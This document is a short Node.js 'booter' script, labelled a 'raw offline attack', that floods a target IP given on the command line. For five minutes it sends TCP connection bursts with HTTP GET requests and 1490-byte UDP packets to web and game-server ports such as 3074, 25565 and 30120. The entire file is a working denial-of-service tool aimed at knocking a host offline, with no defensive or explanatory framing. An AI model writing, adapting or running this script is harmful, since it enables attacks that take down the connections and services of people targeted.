// booter.js — raw offline attack (300 seconds)
const net = require('net');
const dgram = require('dgram');
const ip = process.argv[2];
const duration = 300000; // 5 minutes

let running = true;
setTimeout(() => running = false, duration);

const ports = [80, 443, 3074, 25565, 30120, 7777, 27015, 8080, 1935, 3478, 5060, 5222];

const tcp = () => {
  if (!running) return;
  ports.forEach(port => {
    const sock = new net.Socket();
    sock.connect(port, ip, () => sock.write('GET / HTTP/1.1\r\nHost: '+ip+'\r\n\r\n'));
    sock.on('error', () => {});
    setTimeout(() => sock.destroy(), 100);
  });
};

const udp = () => {
  if (!running) return;
  const client = dgram.createSocket('udp4');
  const payload = Buffer.alloc(1490, 'A');
  ports.forEach(port => client.send(payload, port, ip));
};

setInterval(tcp, 1);
setInterval(udp, 5);

console.log(`Booting ${ip} offline...`);
